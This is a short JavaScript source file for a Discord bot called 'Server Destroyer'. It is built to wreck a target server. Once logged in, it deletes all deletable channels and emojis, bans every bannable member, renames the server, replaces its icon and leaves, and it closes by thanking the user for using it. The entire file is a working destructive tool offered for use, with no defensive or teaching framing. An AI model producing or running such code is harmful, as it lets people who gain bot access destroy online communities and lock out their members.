const Discord = require('discord.js');
const client = new Discord.Client();
const config = require('./config.json');
const packageVersion = require("./package.json").version;

//Made By Conflicted.

console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Starting Server Destroyer, Version: ${packageVersion}. ~(˘▾˘~)`);
client.on('ready', () => {
console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Logged in as ${client.user.tag}. (^o^)／`);
});

client.on('ready', () => {

let guild = client.guilds.get(config.TARGET_SERVER_ID); //Get the guild use the id in Config.json

guild.channels.forEach(async c => { //Get all of the channel then run it one by one

if(!c.deletable) return; //If the bot can't delete/edit the channel then return

console.log(`Deleted Channel : ${c.name}`)

await c.delete('Hehe.') //Delete The Channel
	
});

guild.emojis.forEach(async e => { //Get all of the emojis then run it one by one

if(!e.deletable) return; //If the bot can't delete/edit the emoji then return

console.log(`Deleted Emoji : ${e.name}`)

await guild.deleteEmoji(e); //Delete The Emoji
	
});


//Here is the fun part!

guild.members.forEach(async m => { //Get all of the member of the guild then run it one by one

if(m.id === client.user.id) return; //If the member id = user id then return

if(!m.bannable) return; //If the bot can't ban the member then return

console.log(`Banned : ${m.user.tag}`)

await m.ban('Hehe.'); //Ban The Member
	
});

guild.setName(config.NEW_SERVER_NAME); //Set The Server Name

guild.setIcon(config.NEW_SERVER_ICON_URL); //Set the server icon


guild.leave(); //Leave the server

console.log(`Deleted ${guild.name}!, Thanks for using this bot!`);

});

process.on("uncaughtException", err => {
    console.error("\x1b[37m\x1b[41mERROR\x1b[0m: An unknown and unexpected error occurred! x.x.", err);
});

client.login(config.BOT_TOKEN);

/*

Know Issue : Delete Role Doesn't Work.

*/
